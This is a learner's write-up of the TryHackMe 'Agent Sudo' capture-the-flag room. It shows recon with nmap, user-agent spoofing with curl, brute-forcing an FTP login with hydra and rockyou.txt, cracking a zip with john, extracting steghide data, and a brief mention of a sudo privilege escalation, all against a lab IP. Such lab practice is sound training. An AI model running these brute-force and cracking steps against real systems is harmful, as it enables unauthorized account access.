# TryHackMe Room: Agent Sudo

# Date
    06/13/2025

## Objective
I found a secret server located under the deep sea. My task is to hack inside the server and reveal the truth. 

### Recon
I used the same nmap command as previous rooms to do a bit of recon and find any open ports within the server. 

What I found was 
    - SSH host keys
    - FTP port open
    - SSH port open
    - HTTP port open

The difference with this nmap scan is that i don't see robots.txt and a rejected entry displayed on the output. 

I was curious enough to look up the ip address in the browser and came across the webpage stating that I have to enter a user-agent code name to access secret pages on the website. 

#### Using Curl to spoof a user agent 
I want to use R's codename to see if I can gain any access
```bash
curl -A "R" http://10.10.110.58
```

That did not work, the hint states I should use C

I didn't really find anything. 

So I ran this command with the same AGENT Name, What does the -L flag do? 
```bash
curl -A "C" -L http://10.10.110.58 

Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

Now I know that Agent C's password is weak. I could brute force it perhaps? 

### Brute Forcing 

There is a segment on brute forcing in the room, for the first objective I have to brute force the FTP server. 

The hint said to hail hydra.. I've decided to look up how to use hydra

```bash
hydra -l chris -P rockyou.txt -t 2 ftp://10.10.110.58
```

-t 2 -> amount of allocated threads for this task. I do not have many threads on this system..


login: chris
pass: crystal

I've extracted a .txt file describing how information to get Agent J's passwords are hidden within the images. 

commands to gain access to information 

### Finding passwords through steghide

```bash
binwalk -e cutie.png
cd _cutie.png.extracted/
zip2john 8702.zip > zip.hash
john zip.hash
7z e 8702.zip
steghide info cute-alien.jpg
steghide extract -sf cute-alien.jpg
```

### Using that password to SSH and escalate privileges

SSH into james account using his email and password. 

Found an image that I was curious of. 

scp james@[target]:image.jpg ~/Downloads

^^ from local machine, not in james's ssh 

Then took advtange of a (!all root) vulnerability to get root access


